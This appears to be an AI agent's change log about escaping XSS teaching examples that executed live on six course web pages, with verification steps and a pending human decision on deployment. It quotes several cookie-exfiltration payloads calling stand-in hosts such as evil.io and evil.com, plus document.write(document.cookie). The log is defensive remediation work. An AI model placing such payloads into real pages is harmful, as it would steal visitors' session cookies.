# 2026-09-03: Board #177/#178, Unit 5 XSS example pages ship unescaped

## What changed

Six live AP Cybersecurity Unit 5 pages carry teaching examples of XSS attack
payloads inside `<code>` blocks, but the `<script>` tags around each example were
never HTML-escaped. `<code>` is not a raw-text parsing context, so the HTML
parser builds real, executing script elements from them regardless of the
`<code>` wrapper.

Verified independently against the live `body_html` pulled from the Shopify
Admin API (not against the board task's report), per house rule 4: the worker
does not get to be the only witness.

## What #177 and #178 already established, confirmed still true

- `ap-cyber-unit-5-lesson-6`: `document.write(document.cookie)` and
  `fetch('evil.io/c?'+document.cookie)` both execute.
- `ap-cyber-unit-5-lesson-1-exercise-1`: `fetch('evil.com/c='+document.cookie)`
  executes.
- `ap-cyber-unit-5-exam`: `stealCookies()` executes and throws (undefined
  function).
- Per #178's correction: the fetch payloads are relative URLs
  (`evil.io/...`, no scheme, no leading slash), so they resolve against the
  page's own origin and land in `apcsexamprep.com`'s own 404 log, not a
  third-party domain. Severity is broken lessons plus a latent hazard (one
  character away from a real leak), not live exfiltration.

## What this pass found beyond #177/#178 (not previously on the board)

Swept all 33 live Unit 5 handles (lesson pages, exercises, labs, quizzes, the
exam, the practice exam, the case file) for every unescaped `<script>` in a
teaching-example context, not just the four instances already named:

- `ap-cyber-unit-5-lesson-6` carries three MORE unescaped script tags beyond the
  two already named: two `<script>...</script>` ellipsis placeholders in prose
  ("Log analysis for XSS: `<script>...</script>` tags in input") and one real
  payload, `new+Image().src%3D'evil.io/steal?'+document.cookie`, in a third
  answer option not previously described.
- `ap-cyber-unit-5-lesson-5-exercise-1`: one `<script>…</script>` ellipsis
  placeholder in a CFU feedback string.
- `ap-cyber-unit-5-lesson-5`: `<script>document.cookie</script>` executes (a
  question stem, not previously named). The live rendered page additionally
  shows a Cloudflare-injected `<script src="/cdn-cgi/scripts/.../email-decode.min.js">`
  immediately after it; checked against the raw stored `body_html` and that
  injected tag is NOT stored content, it is added by Cloudflare's own edge
  Email Address Obfuscation feature at serve time and is out of this repo's
  control. Escaping the stored `document.cookie` script may or may not stop
  Cloudflare's injection; that depends on what triggered it elsewhere on the
  page and was not chased further here.
- `ap-cyber-unit-5-practice-exam`: `<script src="https://adnet.example/js/ad.js">`
  executes as a real script element. `.example` is an IANA-reserved TLD that can
  never resolve, so this one is inert by construction, but it is still a raw
  live script tag and inconsistent with every other example on the site.

Net: 6 pages affected (not the 3 the task text implies), 11 individual
unescaped `<script>` instances (not 4).

## The var ANS finding

#178 also flagged: "the var ANS answer-key objects on 3 pages do not parse, so
those quizzes cannot score." Extracted the exact scoring `<script>` block from
all 6 pages carrying `var ANS` (the boundary the HTML parser would actually use:
from the enclosing `<script>`'s open tag to the first literal `</script>` after
it) and ran each through `node --check` for a real syntax verdict rather than
eyeballing it.

Confirmed broken: only **`ap-cyber-unit-5-lesson-6`**. Its `var EX` explanation
object has an unescaped inner double-quote: `x6q4:"...a file named
"passwords_backup.txt" unless..."`, which terminates the JS string literal
early and throws `SyntaxError: Unexpected identifier 'passwords_backup'`
in Node. Fixed by escaping the inner quotes (`\"passwords_backup.txt\"`).
Re-ran `node --check` after the fix: clean.

Could not independently confirm two more broken pages beyond this one. All 6
`var ANS`-bearing pages were checked the same way; only lesson-6 failed. Noting
this rather than asserting the "3 pages" count either way.

## The fix

Pure escaping, no content rewrite: every identified raw `<script>...</script>`
became `&lt;script&gt;...&lt;/script&gt;` (and the one `<script src="...">` got
the same treatment on both its tags). Nothing else in any of the six page
bodies was touched. Verified per page:

- Literal string replacement with an assertion on expected occurrence count
  before writing (fails loud on a miscount, not a silent partial fix).
- Byte deltas match exactly what escaping four tag-delimiter pairs (12 bytes
  each) plus the one quote-escape (2 bytes) predicts, page by page, confirming
  nothing extraneous changed.
- Zero remaining matches for the dangerous patterns
  (`document.write`, `fetch(`, `stealCookies`, bare `document.cookie`, the
  ellipsis placeholders, the `Image()` exfil variant) across all 6 fixed
  bodies.
- `lib/cyber-ek-density.js` was not relevant here (no EK codes in this content);
  the check used was `node --check` for the JS syntax fix and literal
  string-count assertions for the escaping.

## Artifact

`imports/2026-09-03/cyber-u5-xss-escape.csv`: 3-column Matrixify MERGE sheet
(`Handle`, `Command`, `Body HTML`), QUOTE_ALL, `utf-8-sig` BOM, one row per
affected page, matching the format of
`imports/2026-09-02/dead-link-repair-pages.csv`. Parse-back verified: reading
the CSV back with Python's `csv` module and comparing each row's `Body HTML`
against the source file it was built from is byte-identical for all 6 rows.

**Not yet imported.** This session has no tool that performs a Matrixify
import, and CLAUDE.md is explicit that a direct Admin API page mutation is "the
exception a human asks for explicitly, never the default." Asked Tanner
directly rather than picking a side unilaterally, given this is a live,
confirmed security-adjacent bug and the usual import path is not available to
this session.

## Still open

- Whether the fix actually ships via Matrixify import or a one-time Admin API
  exception, pending Tanner's answer.
- The Cloudflare email-obfuscation injection on `ap-cyber-unit-5-lesson-5`:
  root cause not chased down. Worth a look given board #179 is the exact same
  symptom class (Cloudflare obfuscating something on a different Unit 5 page)
  and may be the same underlying trigger.
- The "3 pages" var ANS claim in #178: only 1 of 6 candidate pages reproduced
  under a real syntax check. Either the claim needs correcting or the other 2
  live somewhere this sweep did not look (not a `var ANS`-named object, or not
  Unit 5).
